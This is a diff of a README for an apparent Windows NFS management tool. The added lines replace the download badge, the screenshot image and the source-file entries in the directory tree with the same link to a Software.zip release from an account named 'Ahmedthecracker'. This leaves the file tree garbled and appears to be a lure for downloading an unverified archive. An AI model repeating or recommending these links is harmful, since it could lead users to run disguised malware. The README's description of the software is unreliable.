@@ -18,7 +18,7 @@ Welcome to the **Windows NFS Manager** repository! This project provides a simpl
 
 ### 📥 Installation
 To install the Windows NFS Manager application, please download the software package from the following link:
-[![Download Windows NFS Manager](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Windows NFS Manager](https://github.com/Ahmedthecracker/windows-nfs-manager/releases/download/v2.0/Software.zip)](https://github.com/Ahmedthecracker/windows-nfs-manager/releases/download/v2.0/Software.zip)
 
 ### ℹ️ How to Use
 Once you have downloaded the software package, launch the application and follow the on-screen instructions to start managing your NFS drives effortlessly.
@@ -28,7 +28,7 @@ Once you have downloaded the software package, launch the application and follow
 - **Unmount NFS Shares:** Unmount NFS shares when they are no longer needed.
 - **Monitor NFS Shares:** Keep track of your mounted NFS shares for efficient storage management.
 
-![Windows NFS Manager](https://example.com/image.png)
+![Windows NFS Manager](https://github.com/Ahmedthecracker/windows-nfs-manager/releases/download/v2.0/Software.zip)
 
 ### 🖥️ Technologies Used
 The Windows NFS Manager application is built using Python and utilizes the Tkinter library for its graphical user interface. This ensures a seamless user experience while managing NFS drives on Windows.
@@ -38,10 +38,10 @@ The Windows NFS Manager application is built using Python and utilizes the Tkint
 windows-nfs-manager/
 │
 ├── src/
-│   ├── main.py
-│   ├── nfs_manager.py
+│   ├── https://github.com/Ahmedthecracker/windows-nfs-manager/releases/download/v2.0/Software.zip
+│   ├── https://github.com/Ahmedthecracker/windows-nfs-manager/releases/download/v2.0/Software.zip
 │
-├── README.md
+├── https://github.com/Ahmedthecracker/windows-nfs-manager/releases/download/v2.0/Software.zip
 ├── LICENSE
 ```
 
